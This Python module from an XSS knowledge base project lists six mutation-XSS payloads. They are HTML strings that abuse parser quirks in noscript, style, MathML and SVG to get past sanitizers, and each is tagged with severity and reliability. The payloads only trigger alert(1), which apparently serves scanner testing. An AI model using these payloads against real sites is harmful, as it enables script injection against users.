#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Mutation XSS Payloads
"""

from ..models import PayloadEntry


MUTATION_XSS_PAYLOADS = {
    "mxss_1": PayloadEntry(
        payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Noscript mutation XSS",
        tags=["mxss", "mutation", "noscript"],
        reliability="medium",
    ),
    "mxss_2": PayloadEntry(
        payload="<p><style><\\/style><script>alert(1)<\\/script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Style mutation with escaped slashes",
        tags=["mxss", "mutation", "style"],
        reliability="medium",
    ),
    "mxss_3": PayloadEntry(
        payload="<math><mtext><table><mglyph><style><\\/style><img src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="MathML mutation XSS",
        tags=["mxss", "mutation", "mathml"],
        reliability="medium",
    ),
    "mxss_4": PayloadEntry(
        payload='<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img src=x onerror=alert(1)>">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Complex form/math mutation",
        tags=["mxss", "mutation", "form", "mathml", "svg"],
        reliability="low",
    ),
    "mxss_5": PayloadEntry(
        payload='<svg></p><style><g title="</style><img src=x onerror=alert(1)>">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="SVG style mutation",
        tags=["mxss", "mutation", "svg", "style"],
        reliability="medium",
    ),
    "mxss_6": PayloadEntry(
        payload='<svg><p><style><g title="</style><script>alert(1)</script>">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="SVG paragraph style mutation",
        tags=["mxss", "mutation", "svg", "style", "p"],
        reliability="medium",
    ),
}

MUTATION_XSS_PAYLOADS_TOTAL = len(MUTATION_XSS_PAYLOADS)
